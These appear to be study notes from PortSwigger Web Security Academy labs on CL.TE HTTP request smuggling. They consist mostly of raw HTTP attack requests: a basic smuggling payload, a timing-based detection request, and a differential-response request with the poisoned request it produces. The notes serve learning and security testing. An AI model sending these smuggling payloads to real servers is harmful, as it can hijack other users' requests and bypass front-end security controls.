## CL.TE vulnerabilities

The front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header:

Smuggling request:
```http
POST / HTTP/1.1
Host: 0acd00da03a2776381c07ff100b10027.web-security-academy.net
Content-Length: 7
Transfer-Encoding: chunked

0

G
```

Request sent after get smuggled (the `G` sent before is prepended to `POST`):
```http
GPOST /post/comment HTTP/1.1
Host: 0acd00da03a2776381c07ff100b10027.web-security-academy.net

csrf=rMS2qQHV8HyyZJbcBKObOO78FbBQwIyZ&postId=5&comment=asd&name=asd&email=asd%40asd.asd&website=


HTTP/1.1 403 Forbidden
"Unrecognized method GPOST"
```

### Find CL.TE using timings

>[!note] Note
>Since the front-end server uses the `Content-Length` header, it will forward only part of this request, omitting the `G`. The back-end server uses the `Transfer-Encoding` header, processes the first chunk, and then waits for the next chunk to arrive. This will cause an observable time delay.

```http
POST / HTTP/1.1
Host: 0acd00da03a2776381c07ff100b10027.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked

1
A
G
```

### Confirming CL.TE vulnerabilities using differential responses

Attack request:
```http
POST / HTTP/1.1
Host: 0a0000f7040caa64807e80a800d50021.web-security-academy.net
Cookie: session=YMVczDiZYma5L95S4fFbNXnGVYonnrlD
Content-Length: 30
Transfer-Encoding: chunked
Connection: close

0

POST /404 HTTP/1.1
foo: 
```

If the attack is successful, then the last two lines of this request are treated by the back-end server as belonging to the next request that is received.
This will cause the subsequent "normal" request to look like this:
```http
POST /404 HTTP/1.1
foo:POST / HTTP/1.1
Host: 0a0000f7040caa64807e80a800d50021.web-security-academy.net
Cookie: session=YMVczDiZYma5L95S4fFbNXnGVYonnrlD
Content-Length: 3

a=b
```